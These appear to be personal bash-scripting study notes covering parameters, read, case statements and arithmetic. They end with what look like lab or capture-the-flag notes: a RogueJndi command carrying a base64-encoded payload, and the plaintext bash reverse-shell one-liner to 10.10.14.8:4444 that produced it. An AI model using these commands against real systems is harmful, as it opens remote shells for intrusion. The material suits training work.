pass command, cmd substitution = `$(cmd)` \
variable = `${variable}`
parameter - variable being used inside the shell script
arguement - data passed into the shel lscritp
	arguement used in command line becoems the value stored in a parameter

`${0}` - first positional parameter - what is typed in the cmd line to execute the script - returns output of the command
`${1}` - value fo the first arguement passed to the script on the cmd
expression = `[[ expression ]]
`${?}` exit status variable
read input `read ` `-p` -passes the input onto value 
	ex. `read -p 'Entire input: ' variable_name`
useradd `-c` -comment for user `-m`(make home directory) `"username"`
shuf - shuffles entire lines
fold - wrap each input line to match space 
which - finds which path x command will execute from
	`which head` - finds location of head cmd
hash - `hash` - changes shell remembered locations
basename - strips out directory and suffix from filenames - aka display only filename - doesnt do smart checking
dirname - strips last component from file name - aka display only directory  - doesnt do smart checking
!`letter` - goes back to last command that started with X letter
`${@}` - puts each input as seperate words
`${*}` - puts each input as one word
`${#}` - represents the number of arguments
`sleep -s m h d` - delays command for -seconds -minutes -hours -days
`shift` - each time the cmd runs, ${#} goes down one
`readonly [variable]=[variable assignment]` - read only variable 
`getopts` - used matching pattern to get options from input
	`getopts input options OPTION`
	`while GET`
`bash pgrep -x` - check processes
`
### Case
case `[input]` in
`value`) `command` ;;
;; - block ender
esac - case finish

When trying to do math in bash format is `$(( NUM + NUM ))`
num can be variables as well but dont need ${} 


________________________________________________________________________
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.10.14.8"

echo 'bash -c bash -i >&/dev/tcp/10.10.14.8/4444 0>&1' |
base64

6ced1a6a89e666c0620cdb10262ba127

